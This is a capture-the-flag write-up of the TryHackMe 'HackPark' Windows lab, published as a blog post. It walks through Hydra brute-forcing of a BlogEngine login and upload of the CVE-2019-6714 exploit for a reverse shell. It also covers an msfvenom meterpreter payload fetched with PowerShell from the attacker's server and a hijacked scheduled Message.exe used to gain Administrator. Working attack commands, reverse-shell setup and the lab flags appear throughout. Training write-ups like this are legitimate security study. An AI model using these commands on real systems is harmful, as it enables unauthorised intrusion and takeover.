---
layout: post
title: THM — HackPark
date: 2022-09-29 00:00:00 -500
categories: [TryHackMe]
tags: [Hydra]
---

<img src="/assets/images/HackPark/logo.png" alt="HackPark Logo" width="30%">

***
<center><strong><font color="White">Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!</font></strong></center>

***

## <strong><font color="#34A5DA">Reccon</font></strong>

After deploying the machine we can run basic nmap scan for open ports & services on the target machine.

```console
vladislav@Mac ~ % nmap -sV 10.10.205.86
Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-28 23:06 MSK
Nmap scan report for 10.10.205.86
Host is up (0.068s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.41 seconds
```

We can see that there is an HTTP service on port 80, then we open `10.10.205.86:80` in browser.

There we are interested in the login page. Inspecting the login form we can find out that it's using POST request type.

<img src="/assets/images/HackPark/1.png" alt="Inspecting the site" width="70%">

Moreover, the url of the login page is the following: `http://10.10.205.86/Account/login.aspx?ReturnURL=/admin/`.

***

## <strong><font color="#34A5DA">Using Hydra for brute-forcing the login</font></strong>

Now we know the URL, request type and probably the login name, so we can start brute-force with Hydra.

However, first we need to intercept the POST request using Burp Suite.

```http
POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
Host: 10.10.205.86
Content-Length: 578
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.205.86
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.205.86/Account/login.aspx?ReturnURL=/admin/
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=user&ctl00%24MainContent%24LoginUser%24Password=pass&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8
```

Now we can use Hydra for cracking the password.

> [Good notes on hydra](https://github.com/gnebbia/hydra_notes)

We set username with `-l admin`, password list with `-P /share/wordlists/rockyou.txt`, target machine IP, HTTP form and "request string".

Request string contains of three elements separated by `:`:

* pageOnWhichTheLoginHappens
* list of parameters, here we have to specify with `^USER^` and `^PASS^` where usernames and passwords will be inserted
* a character which may be F (for failing strings) or S for successful strings followed by an equal sign `=` and a string which appears in a failed attempt or in a successful attempt

So in our case request string contains:

* `/Account/login.aspx?ReturnURL=/admin/` from the URL
* "`__VIEWSTATE`". There we should change two things: `UserNameuser` to `UserName=^USER^` and `Password=pass` to `Password=^PASS^`
* S=Success.

Here's the final hydra payload:

```bash
hydra -l admin -P share/wordlists/rockyou.txt 10.10.80.203 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8:F=Failed"
```

```console
vladislav@Mac ~ % hydra -l admin -P share/wordlists/rockyou.txt 10.10.80.203 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8:F=Failed"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-29 00:06:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
[DATA] attacking http-post-form://10.10.80.203:80/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8:F=Failed
[STATUS] 995.00 tries/min, 995 tries in 00:01h, 14343406 to do in 240:16h, 16 active
[80][http-post-form] host: 10.10.80.203   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-29 00:08:15
```

So, the password is `1qaz2wsx`.

***

## <strong><font color="#34A5DA">Compromizing the machine</font></strong>

After logging into admin account we can find the blogengine version: `3.3.6.0`.

![BlogEngine About page](/assets/images/HackPark/2.png)

Searching on exploit-db, we can find the [vulnerability](https://www.exploit-db.com/exploits/46353). CVE-2019-6714. Download the script.

Firstly, we need to modify the script by changing the IP and Port of TCP connection.

Secondly, we need to rename the script:

```bash
mv 46353 PostView.ascx
```

Thirdly, we setup a reverse TCP listener. We can do this using netcat.

```console
vladislav@Mac ~ % netcat -nlvp 4445
```

After that we should upload the script using blogengine control panel:
1. Switch to *Dashboard*
2. Go to "*Published Posts*"
3. Go to "*Welcome to HackPark*"
4. In the text editor press the button "*File Manager*" and upload the PostView.ascx

Finally, go to `http://10.10.29.8:80?theme=../../App_Data/files`. If everything done right, we recieve the connection.

```console
vladislav@Mac Downloads % netcat -nlvp 4445
Connection from 10.10.29.8:49232
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

***

## <strong><font color="#34A5DA">Windows Privilege Escalation</font></strong>

According to the next task we need to generate another reverse shell using msfvenom.

First, we need to generate the executable with msfvenom. Use another port!

```console
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.7.222 LPORT=4446 -f exe > rev_shell.exe

```

Next, start a simple HTTP server on your attack machine:
```bash
python3 -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
```

On the reverse shell download the script:
```
powershell -c Invoke-WebRequest -uri "http://10.18.7.222:8000/rev_shell.exe" -outfile "C:\\Windows\temp\rev_shell.exe"
```

Next, we need to setup a Metasploit TCP Reverse Shell:

```console
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.18.7.222
msf6 exploit(multi/handler) > set LPORT 4446
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.18.7.222:4446 
```

Run the uploaded script on the target machine:
```console
cd \windows\temp
.\rev_shell.exe
```

If everything done right, we get the meterpreter reverse TCP session:
```console
[*] Started reverse TCP handler on 10.18.7.222:4446 
[*] Sending stage (175686 bytes) to 10.10.29.8
[*] Meterpreter session 1 opened (10.18.7.222:4446 -> 10.10.29.8:49264) at 2022-09-29 16:32:08 +0300

meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

Next, let's use WinPEAS — a script that search for possible paths to escalate privileges on Windows hosts:
```bash
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
```

On the meterpreter session:
```console
meterpreter > upload winPEAS.bat c:\\windows\\temp
[*] uploading  : /Users/vladislav/winPEAS.bat -> c:\windows\temp
[*] uploaded   : /Users/vladislav/winPEAS.bat -> c:\windows\temp\winPEAS.bat
```

Run the script:
```console
c:\Windows\Temp>.\winPEAS.bat
.\winPEAS.bat

 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 [+] GPP Password

 [+] Cloud Credentials

 [+] AppCmd
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe
C:\Windows\system32\inetsrv\appcmd.exe exists. 

 [+] Files in registry that may contain credentials
   [i] Searching specific files that may contains credentials.
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
Looking inside HKCU\Software\ORL\WinVNC3\Password
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion

Looking inside HKCU\Software\TightVNC\Server
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
Looking inside HKCU\Software\OpenSSH\Agent\Keys
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml
C:\Windows\Panther\setupinfo
C:\Windows\System32\inetsrv\appcmd.exe
C:\Windows\SysWOW64\inetsrv\appcmd.exe
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe
C:\inetpub\wwwroot\Web.config
C:\inetpub\wwwroot\Account\Web.Config
C:\inetpub\wwwroot\admin\Web.Config
C:\inetpub\wwwroot\admin\app\editor\Web.Config
C:\inetpub\wwwroot\setup\Web.config

---
Scan complete.
    
     ,/*,..*(((((((((((((((((((((((((((((((((,

   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
PowerShell v2 Version:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
    PowerShellVersion    REG_SZ    2.0

PowerShell v5 Version:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
    PowerShellVersion    REG_SZ    4.0

Transcriptions Settings:
Module logging settings:
Scriptblog logging settings:

PS default transcript history

Checking PS history file

 [+] MOUNTED DISKS
   [i] Maybe you find something interesting
Caption  
C:       



 [+] ENVIRONMENT
   [i] Interesting information?

ALLUSERSPROFILE=C:\ProgramData
CommonProgramFiles=C:\Program Files (x86)\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=HACKPARK
ComSpec=C:\Windows\system32\cmd.exe
CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT
E=0x1B[
FP_NO_HOST_CHECK=NO
long=false
NUMBER_OF_PROCESSORS=2
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
Percentage=1
PercentageTrack=30
PROCESSOR_ARCHITECTURE=x86
PROCESSOR_ARCHITEW6432=AMD64
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=4f01
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files (x86)
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
PUBLIC=C:\Users\Public
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Windows\TEMP
TMP=C:\Windows\TEMP
USERDOMAIN=IIS APPPOOL
USERNAME=Blog
USERPROFILE=C:\Users\Default
windir=C:\Windows

 [+] INSTALLED SOFTWARE
   [i] Some weird software? Check for vulnerabilities in unknow software installed
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software

Amazon
Common Files
Common Files
Internet Explorer
Internet Explorer
Microsoft.NET
SystemScheduler
Windows Mail
Windows Mail
Windows NT
Windows NT
WindowsPowerShell
WindowsPowerShell
    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\
    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\

Looking inside HKCU\Software\OpenSSH\Agent\Keys





C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml
C:\Windows\Panther\setupinfo
C:\Windows\System32\inetsrv\appcmd.exe
C:\Windows\SysWOW64\inetsrv\appcmd.exe
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe
C:\inetpub\wwwroot\Web.config
C:\inetpub\wwwroot\Account\Web.Config
C:\inetpub\wwwroot\admin\Web.Config
C:\inetpub\wwwroot\admin\app\editor\Web.Config
C:\inetpub\wwwroot\setup\Web.config

---
Scan complete.
 [+] Remote Desktop Credentials Manager
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager


Looking inside \Microsoft\Credentials\


 [+] Unattended files

 [+] SAM and SYSTEM backups

 [+] McAffee SiteList.xml
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 [+] GPP Password

 [+] Cloud Credentials
```

However, it doesn't give us some useful information.

```console
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User              Path
 ---   ----  ----                  ----  -------  ----              ----
 0     0     [System Process]
 4     0     System
 68    680   svchost.exe
 368   4     smss.exe
 488   2084  findstr.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\findstr.exe
 524   516   csrss.exe
 580   572   csrss.exe
 588   516   wininit.exe
 616   572   winlogon.exe
 680   588   services.exe
 688   588   lsass.exe
 748   680   svchost.exe
 756   2560  rev_shell.exe         x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\rev_shell.exe
 792   680   svchost.exe
 868   680   svchost.exe
 884   680   svchost.exe
 888   616   dwm.exe
 912   680   svchost.exe
 964   680   svchost.exe
 1108  680   svchost.exe
 1136  680   spoolsv.exe
 1168  680   amazon-ssm-agent.exe
 1244  680   svchost.exe
 1264  680   LiteAgent.exe
 1364  680   svchost.exe
 1380  680   svchost.exe
 1408  680   WService.exe
 1456  2560  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 1544  1408  WScheduler.exe
 1640  680   Ec2Config.exe
 1732  748   WmiPrvSE.exe
 1836  2084  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 1876  2084  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 2084  2792  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 2088  2484  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 2092  2488  Message.exe
 2428  680   msdtc.exe
 2484  2792  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 2488  2188  WScheduler.exe
 2504  912   taskhostex.exe
 2560  2792  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 2580  2572  explorer.exe
 2676  748   WmiPrvSE.exe
 2792  1380  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
 3032  2528  ServerManager.exe
```

Here we can see two interesting processes: WService.exe and WScheduler.exe. Let's take a look at scheduler:

```
meterpreter > cd "Program Files (x86)"
meterpreter > cd SystemScheduler
meterpreter > cd Events
```

Here we can see a file called `20198415519.INI_LOG.txt`. It contains the following information:
```
...
09/29/22 07:10:05,Event Started Ok, (Administrator)
09/29/22 07:10:38,Process Ended. PID:2224,ExitCode:4,Message.exe (Administrator)
09/29/22 07:11:03,Event Started Ok, (Administrator)
09/29/22 07:11:35,Process Ended. PID:2092,ExitCode:4,Message.exe (Administrator)
09/29/22 07:12:05,Event Started Ok, (Administrator)
09/29/22 07:12:35,Process Ended. PID:2896,ExitCode:4,Message.exe (Administrator)
09/29/22 07:13:03,Event Started Ok, (Administrator)
09/29/22 07:13:34,Process Ended. PID:1964,ExitCode:4,Message.exe (Administrator)
09/29/22 07:14:03,Event Started Ok, (Administrator)
09/29/22 07:14:33,Process Ended. PID:2588,ExitCode:4,Message.exe (Administrator)
09/29/22 07:15:01,Event Started Ok, (Administrator)
09/29/22 07:15:33,Process Ended. PID:2212,ExitCode:4,Message.exe (Administrator)
09/29/22 07:16:01,Event Started Ok, (Administrator)
09/29/22 07:16:34,Process Ended. PID:2752,ExitCode:4,Message.exe (Administrator)
09/29/22 07:17:02,Event Started Ok, (Administrator)
...
```

As we can see, Windows Scheduler starts `Message.exe` every 30 seconds.

And fortunately we have all permissions for this file:
```
meterpreter > ls
Listing: c:\Program Files (x86)\SystemScheduler
===============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
...
100777/rwxrwxrwx  536992   fil   2018-03-25 20:58:56 +0300  Message.exe
...
```

Change the original `Message.exe` to our `rev_shell.exe`:

```
meterpreter > mv /windows/temp/rev_shell.exe "c:\Program Files (x86)\SystemScheduler\rev_shell.exe"
meterpreter > mv Message.exe Message.f
meterpreter > mv rev_shell.exe Message.exe
```

Reload reverse TCP handler. And finally we get Administrator's privileges:

```console
meterpreter > getuid
Server username: HACKPARK\Administrator
```

Now we can find user.txt on Jeff's Desktop containing: `759bd8af507517bcfaede78a21a73e39`.

Also, the root flag on Administrator's Desktop which contains: `7e13d97f05f7ceb9881a3eb3d78d3e72`.